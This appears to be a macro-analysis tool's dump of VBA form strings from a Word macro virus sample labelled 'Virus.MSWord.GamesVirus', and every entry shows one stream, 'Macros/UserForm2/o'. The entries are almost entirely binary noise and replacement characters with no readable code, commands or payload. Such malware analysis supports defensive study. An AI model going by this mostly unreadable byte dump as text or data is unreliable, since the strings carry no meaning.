VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::<::9<<9:<<<:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::���������������������������������������������������������ސ�������������oo��������������:��ö�������������������������������񞗘����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99<99999999�9999999�999999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������������������������������������������:::�:::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ĸ��99��������������������������������������������������궖���������ý
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:ooo������������������ö�������ý�������������������Ö������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�9<99999<99999<<�<9<<9999:9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��������������������������������������������������:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::���:����������������������������������������������������򑐖�������ooo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oo�������Ó�������������������ý�����������<����Ñ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T<99999�999<<:<<:9�90
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�9<�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:���������������������������������������������������������������:o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�����������ý��:����������:�����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9999N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HQC09�<9:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Õý��������������������񶡡�����������������������������������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o����������������������������ý��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B9999R�<9�I�9I<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F:NI<99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������Ý��������������򶚙�����������������������������������������������������������������������������������������������:�o:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������Õ���������ý�񽕽��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TF<��99I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������񑙚������������򶚞��������������������������������������������������������������������������������������������񚖽��������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K<9<BU�9�99�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TF9<9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��ý��������������������Ö�����������������������������90(Y*,4�����������������������������������������������������������������������������ý�������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F<99T�R9<999�9��9999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ý�Ó�Õ�򙙐����������Ö����������������������������:0(0::!&����������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I9<99SH999�999999999F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<99�FI0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IKKP�J�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����å������Ö�����������Ñ���������������������������:9::::-&(.��������������������������������������������񽽎��������������������������������������ýý����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I9999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999999�9�9999<9<99999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JCSD�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������Ö�����������Ñ���������������������������:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
01&3'4�������������������������������������������񽓑���������������������������ý������Ñ�����������:����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I99::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9<<:<9<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::9:::<999�KK0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IG�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HOP9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�ÑÕ:����򑖖��������Í���������������������������:::0,1'685*������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I<9FI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<K:��:�FIF9J<9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0:99��JF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FIQX�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������ý������ܖ���������o���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:9(,+#;>>%/��������������������������������������o����������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F9F�<F9I9F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FKBAJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ý���������񑗐������oo��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::0.&'6;;;1m����������������������������������������Í������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999F0K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������򑎎����o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9/,&3$8$3,�������������������������������������������������Ø�����������������������������������������������������޶������ý:��::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JEK9R<9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<9�9<999NR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HHN99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ý��ý��:����򎎑����oo�������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y,&3''&+(�������������������������������������������������������Ó��񞘘���������������������������������жÓ�Ó���������::�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I9<::<�:99<��<��999:::::<99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OHF99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�99������ý��:�������������ooo������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::(-,++,9:!(������������������������������������������������򔘘���������Ù�����������������������������ړ����������������:�::�:�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�ro:oo:ooooo:oooo:ooooooooo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
STRBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:9�����Õ���������򙢡���:����������������������������::::((0:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+#3+$�����������������������������������������������������������å�񚙚������������������������ޥ������������������:��:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cneFor
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<cB9coK9[o[0[r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�9KF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0I9:N�:���������������򡡡������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::0+'''!6+����������������������������������������������������������������������������������������ޓ���������������������:�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HEX:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H0:::::�Q<oC9OVIRPG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�����������򶡡��������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::-1&1++,*Y���������������������������������������������Ð���������:ö��������������������������޶ړ���Ó�����å����������<�::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
orrREFJP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::9EU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OMM<BJ�I������9����������������������������������������������������:::(,+1)-*99���������������������������������������������������������ýÕ�񙘘���������������������춓����������������������:::�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IFoooor
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XQoHS9pE<oo�I�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������Ñ�������������Ñ�������������������������������::0:(*(09:�����������������������������������������������������������������������������������������������������������������999�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cpd\_cp[[Z\ZkZk`b^Zbm_[[mZcc\m^^`p\_[[^b^\qbbg`<�������������������������񓑑������������������������������9.(<:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������򘚘���������������ڶ�ޥ����������å��������������î9F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cbbhhhhihhnhghhhghhgiiiinniihignhnhiiigggnnnhaD9������񑎑��������������Î��������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:0<������������������������������������������������������������������������������������춓����Ó���������������������9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::�9��99999�9�999�99:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������:��������������������������������������������������������������������������������������������������Ó������������Õ9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9999999999999999999<::9��9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:�����������������������������񑐐���������������������������������������������������������������������������������:����������������������������������ڶÓ��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��99:9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�����ý񍍎������������������򐖖�������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9<<:9:99��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�������������������������������򑝔�����������������������������������������������������������������������������������������������������������ڶ���Ó�������������������������Õ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C99�FFF<K:9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��������������������������������������������������ڮ��Ó�����������������������������å
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�T9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B:9C999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������Ú�������������������Ù���������������������������������������������������������<�9<<�:����������������������������������������������޶�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��å����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������Õ��Ö�����������������������������������������������������������������������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������ޓ����������Ó�������������999�9��Õ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
90�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�����9�����Ð���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�9:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�������������������������������������������퓓�����Ó����������������������9�9�<��9�
-------------------------------------------------------------------------------
